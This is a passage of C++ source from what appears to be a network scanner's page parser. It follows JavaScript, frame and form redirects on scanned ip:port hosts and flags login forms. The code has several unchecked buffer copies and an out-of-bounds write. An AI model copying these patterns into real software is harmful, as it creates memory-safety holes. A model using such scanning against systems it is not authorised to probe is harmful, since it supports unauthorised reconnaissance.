					strncpy(temp3, (char*)(temp + 4), sz < 128 ? sz : 128);
				};

				if(strstri(temp3, "http://") == NULL && strstri(temp3, "https://") == NULL)
				{
					if(temp3[0] != '.')
					{
						if(temp3[0] != '/')
						{
							char temp4[512] = {0};
							strcpy(temp4, "/");
							strcat(temp4, temp3);
							strncpy(temp3, temp4, 512);
						};
					};
				};

				redirectStr = std::string(temp3);
				if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
				{
					redirStrLst->push_back(redirectStr);
					redirectReconnect(cookie, ip, port, temp3, l, ps, redirStrLst, rBuff);
				};
				strcat(ps->headr, " ");
				return -2;
			};

			strcat(ps->headr, finalstr); 
			strcat(ps->headr, " ");
			return 0;
		};
	};
	if((strstri(str, "location.href") != NULL || strstri(str, "window.location =") != NULL || strstri(str, "window.location=") != NULL)
		&& strstri(str, "onClick=\"location.href") == NULL)
	{
		char startPoint[32] = {0};
		if(strstri(str, "location.href=") != NULL) strcpy(startPoint, "location.href=");
		else if(strstri(str, "location.href =") != NULL)  strcpy(startPoint, "location.href =");
		else if(strstri(str, "window.location=") != NULL)  strcpy(startPoint, "window.location=");
		else if(strstri(str, "window.location =") != NULL)  strcpy(startPoint, "window.location =");
		else 
		{
			strcat(ps->headr, "[JS-Err: Key-word]");
		};
		if(strlen(startPoint) != 0)
		{
			char tredStr[512] = {0};		
			char *temp1 = strstri(str, startPoint);
			char *temp2 = FindFirstOcc(temp1, "\"'}");
			char *temp3 = FindFirstOcc(temp2 + 1, "\"'}");
			int sz = temp3 - temp2 - 1;
			strncpy(tredStr, temp2 + 1, (sz < 511 ? sz : 511));
			char redStr[512] = {0};			
			if(strstri(tredStr, "+") != NULL)
			{
				strncpy(redStr, tredStr + 1, 511);
				sz = strlen(tredStr) - 1;
			}
			else strcpy(redStr, tredStr);

			if(sz == 0)
			{
				temp2 = FindFirstOcc(temp1, "=");
				temp3 = FindLastOcc(temp2 + 1, " ");
				char *temp4 = FindFirstOcc(temp3 + 1, ";\r\n ");
				sz = temp4 - temp3 - 1;
				strncpy(redStr, temp3 + 1, (sz < 511 ? sz : 511));
			};

			if(strstri(redStr, "/") == NULL && strstri(redStr, ".") == NULL)
			{
				strncpy(redStr, _ValidateRedStr(str, redStr), 511);
			};

			if(strlen(redStr) > 0 && ip != NULL)
			{
				if(strstr(redStr, "http://") == NULL && strstr(redStr, "https://") == NULL)
				{
					if(redStr[0] != '/')
					{
						char tempRedStr[512] = {0};			
						strcpy(tempRedStr, "/");
						strcat(tempRedStr, redStr);
						strcpy(redStr, tempRedStr);
					};
				};
				redirectStr = std::string(redStr);
				if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
				{
					redirStrLst->push_back(redirectStr);
					redirectReconnect(cookie, ip, port, redStr, l, ps, redirStrLst, rBuff);
				};
				return -2;
			}
			else
			{
				if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::location.href_Parser.");
				++Filt;
				strcpy(ps->headr, "[IGNR_ADDR]"); 
				strcpy(ps->path, "/"); 
				return 0;
			};
		};
	};
	if(strstri(str, "location.replace") != NULL)
	{
		char redStr[512] = {0};		
		char tredStr[512] = {0};		
		char *temp1 = strstri(str, "location.replace");	
		char *temp2 = FindFirstOcc(temp1, "(");
		char *temp3 = FindFirstOcc(temp2 + 1, ")");	
		int sz = temp3 - temp2 - 1;
		strncpy(tredStr, temp2 + 1, (sz < 511 ? sz : 511));
		if(strstr(tredStr, "\"") != NULL || strstri(tredStr, "'") != NULL)
		{
			temp2 = FindFirstOcc(tredStr, "\"'");
			temp3 = FindFirstOcc(temp2 + 1, "\"'");	
			sz = temp3 - temp2 - 1;								
			strncpy(redStr, temp2 + 1, (sz < 511 ? sz : 511));
		}
		else if(strstr(tredStr, " ") != NULL )
		{
			char tredStr2[512] = {0};	
			temp1 = strstr(tredStr, " ");
			temp2 = FindLastOcc(temp1, " ");				
			temp3 = FindFirstOcc(temp2 + 1, " ");				
			sz = temp3 - temp2 - 1;								
			strncpy(tredStr2, temp2 + 1, (sz < 511 ? sz : 511));
			strncpy(redStr, _ValidateRedStr(str, tredStr2), 511);
		}
		else
		{
			strncpy(redStr, _ValidateRedStr(str, tredStr), 511);			
		};

		if(strlen(redStr) > 0)
		{
			redirectStr = std::string(redStr);
			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
			{
				redirStrLst->push_back(redirectStr);
				redirectReconnect(cookie, ip, port, redStr, l, ps, redirStrLst, rBuff);
			};
			return -2;
		}
		else
		{
			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::location.replace_Parser.");
			++Filt;
			strcpy(ps->headr, "[IGNR_ADDR]"); 
			strcpy(ps->path, "/"); 
			return 0;
		};
	};
	
#pragma endregion

	if((strstri(str, "location ='") != NULL || strstri(str, "location='") != NULL
			|| strstri(str, "location =\"") != NULL || strstri(str, "location=\"") != NULL
			|| strstri(str, "location = \"") != NULL || strstri(str, "location= \"") != NULL
			|| strstri(str, "location = '") != NULL || strstri(str, "location= '") != NULL)
			&& strstri(str, "window.location") == NULL
		)
	{ 
		char *temp2 = {0}, *temp1 = {0}, *temp = {0};
		char quoteArr[1] = {0};
		int checkRes = 0;
		int offset = 0;
		if(strstri(str, "location =") != NULL)
		{
			offset = strlen("location =");			
			temp = strstri(str, "location =");
			quoteArr[0] = (char)(temp[strlen("location =")]);
			if(quoteArr[0] == ' ') 
			{
				quoteArr[0] = (char)(temp[strlen("location =") + 1]);
				++offset;
			};
		}
		else if(strstri(str, "location=") != NULL)
		{
			offset = strlen("location=");
			temp = strstri(str, "location=");
			quoteArr[0] = (char)(temp[strlen("location=")]);
			if(quoteArr[0] == ' ')
			{
				quoteArr[0] = (char)(temp[strlen("location=") + 1]);
				++offset;
			};
		};

		memset(quoteArr + 1, '\0', 1);

		char location[512] = {0};
		if(strstri(temp + offset + 1, quoteArr) != NULL) temp1 = strstri(temp + offset + 1, quoteArr);
		else 
		{
			strcpy(ps->headr, "[JARedirect: Cannot retrieve link.]"); 
			strcpy(ps->path, "/"); 
			return 0;
		};
		checkRes = temp1 - temp - offset;

		char newLoc2[512] = {0};
		ZeroMemory(newLoc2, sizeof(newLoc2));
		if (checkRes > 512 || checkRes < 0) checkRes = 512;
		strncpy(location, temp + 1 + offset, checkRes - 1);
		if(strstri(location, "http") != NULL) strcpy(newLoc2, location);
		else
		{
			strncpy(newLoc2, "http://", strlen("http://"));
			strcat(newLoc2, ip);
			strcat(newLoc2, ":");
			strcat(newLoc2, std::to_string((long double)port).c_str());
			if(temp[1 + offset] != '/') strcat(newLoc2, "/");
			strncat(newLoc2, temp + 1 + offset, checkRes - 1);
		};		

		redirectStr = std::string(newLoc2);
		if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
		{
			redirStrLst->push_back(redirectStr);
			redirectReconnect(cookie, ip, port, newLoc2, l, ps, redirStrLst, rBuff);
		};
		return -2;
	};

	if(strstri(str, "<frameset") != NULL || strstri(str, "<frame") != NULL || strstri(str, "<iframe") != NULL)
	{
		char *str1;
		char *str2;
		char lol[128] = {0};
		char tag[16] = {0};
		int AreaLen = 0;

		if(strstri(str, "<frameset") != NULL) str1 = strstri(str, "<frameset");
		else if(strstri(str, "<frame") != NULL) str1 = strstri(str, "<frame");
		else if(strstri(str, "<iframe") != NULL) str1 = strstri(str, "<iframe");

		if(strstri(str1, "src=\"") != NULL) 
		{
			str1 = strstri(str1, "src=\""); 
			AreaLen = 5;
		}
		else if(strstri(str1, "src='") != NULL) 
		{
			str1 = strstri(str1, "src='");
			AreaLen = 5;
		}
		else if(strstri(str1, "src = \"") != NULL)
		{
			str1 = strstri(str1, "src = \"");
			AreaLen = 7;
		}
		else if(strstri(str1, "src = '") != NULL) 
		{
			str1 = strstri(str1, "src = '");
			AreaLen = 7;
		}
		else if(strstri(str1, "src=") != NULL) 
		{
			str1 = strstri(str1, "src=");
			AreaLen = 4;
		}
		else if(strstri(str1, "src = ") != NULL) 
		{
			str1 = strstri(str1, "src = ");
			AreaLen = 6;
		}
		else 
		{
			str1 = NULL;
			AreaLen = 0;
		};

		while(str1 != NULL)
		{
			str2 = FindFirstOcc(str1 + AreaLen, "'\">");

			char script[128] = {0};
			int sz = (int)(str2 - str1) - AreaLen;
			if((int)(str2 - str1) < 128) strncpy(script, str1 + AreaLen, sz);
			if(strstri(script, "http://") == NULL) 
			{
				strcpy(lol, "http://");
				strcat(lol, ip);
				strcat(lol, ":");
				strcat(lol, std::to_string((long double)port).c_str());
				if(script[0] != '/') strcat(lol, "/");
				strcat(lol, script);
			}
			else strcpy(lol, script);

			int flag = 0;
			if(sz > 0) 
			{
				redirectStr = std::string(lol);
				if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
				{
					redirStrLst->push_back(redirectStr);
					redirectReconnect(cookie, ip, port, lol, l, ps, redirStrLst, rBuff);
				};
			}
			else
			{
				strcat(ps->headr, " ");
				strcat(ps->headr, "[Frame redirector: Zero-length location?]");
				strcpy(ps->path, "/"); 
			};

			flag = ps->flag;
			if(flag == 1 || flag == 11 || flag == 12
				|| flag == 13 || flag == 14 || flag >= 17 || flag == 10)
			{
				return -2;
			};

			if(strstri(str1, "<frameset") != NULL) str1 = strstri(str1, "<frameset");
			else if(strstri(str1, "<frame") != NULL) str1 = strstri(str1, "<frame");
			else break;

			if(strstri(str1, "src=\"") != NULL) 
			{
				str1 = strstri(str1, "src=\""); 
				AreaLen = 5;
			}
			else if(strstri(str1, "src='") != NULL) 
			{
				str1 = strstri(str1, "src='");
				AreaLen = 5;
			}
			else if(strstri(str1, "src = \"") != NULL)
			{
				str1 = strstri(str1, "src = \"");
				AreaLen = 7;
			}
			else if(strstri(str1, "src = '") != NULL) 
			{
				str1 = strstri(str1, "src = '");
				AreaLen = 7;
			}
			else if(strstri(str1, "src=") != NULL) 
			{
				str1 = strstri(str1, "src=");
				AreaLen = 4;
			}
			else if(strstri(str1, "src = ") != NULL) 
			{
				str1 = strstri(str1, "src = ");
				AreaLen = 6;
			}
			else 
			{
				str1 = NULL;
				AreaLen = 0;
			};
		};
		return -2;
	}
	if(strstri(str, "<form ") != NULL) 
	{
		strcat(ps->headr, " [Login form detected]");
		char *ptr1 = strstri(str, "<form");
		char *ptr2 = strstri(ptr1, "action");
		if(ptr2 != NULL)
		{
			char *ptr3 = strstri(ptr2, "=");
			char *ptr4 = 0;
			char *ptrEnd = 0;
			int sz = 0;
			char redirStr[512] = {0};
			if(ptr3[1] == ' ' || ptr3[1] == '"' || ptr3[1] == '\"')
			{
				ptr4 = FindFirstOcc(ptr3, " \"'\n\r");
				ptrEnd = FindFirstOcc(ptr4 + 1, " \"'\n\r");
				sz = ptrEnd - ptr4 - 1;
				strncpy(redirStr, ptr4 + 1, sz < 512 ? sz : 512);
			}
			else 
			{
				ptrEnd = FindFirstOcc(ptr3, " \"'\n\r");
				sz = ptrEnd - ptr3 - 1;
				strncpy(redirStr, ptr3 + 1, sz < 512 ? sz : 512);
			};
		
			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirStr) == redirStrLst->end()) 
			{		
				redirStrLst->push_back(redirStr);
				redirectReconnect(cookie, ip, port, redirStr, l, ps, redirStrLst, rBuff);
			};
			return -2;
		}
		else
		{
			strcat(ps->headr, " [Form action not found]");
		};
		return 0;
	};

	if(strlen(ps->headr) == 0)
	{
		strcat(ps->headr, "[Empty title]");
		if(strstri(str, "<html") == NULL && strstri(str, "<!doctype html") == NULL) 
		{
			strcat(ps->headr, "[No html]"); 
		};
		if(strstri(str, "<body") == NULL) 
		{
			strcat(ps->headr, "[No body]");
		};

		if(strstri(str, "\r\n\r\n") != NULL) 
		{
			char *tempStr = strstri(str, "\r\n\r\n");
			if(strlen(tempStr) - 4 >= 250)
			{
				if(strstr(str, "Content-Encoding: gzip") != NULL)
				{
					strcat(ps->headr, "[GZIP]");			
				};
				strcat(ps->headr, " [Data: ");
				if(strstri(tempStr + 4, "<body") != NULL)
				{
					strncat(ps->headr, strstri(tempStr, "<body") + 5, 64); 
				}
				else if(strstri(tempStr + 4, "<html") != NULL)
				{
					strncat(ps->headr, strstri(tempStr, "<html") + 5, 64); 
				}
				else if(strstri(tempStr + 4, "</style>") != NULL)
				{
					strncat(ps->headr, strstri(tempStr, "</style>") + 8, 64); 
				}
				else strncat(ps->headr, tempStr + 4, 64); 
				strcat(ps->headr, "]"); 
			}
			else
			{
				if(gNegDebugMode) 
				{
					stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::Lowload_body (&lt;250b)");
				};

				++Filt;
				strcpy(ps->headr, "[IGNR_ADDR]"); 
				strcpy(ps->path, "/"); 
				return 0; 
			};
		}
		else
		{
			strcat(ps->headr, " [Data:");
			strncat(ps->headr, str, 128);
			strcat(ps->headr, "]"); 
		};
	};
	ps->flag = ContentFilter(str, port, ip);

	if(strstri(str, "window.open(") != NULL)
	{
		_getPopupTitle(ps, strstri(str, "window.open("));
	};

	strcpy(ps->path, "/");
	return 0;
};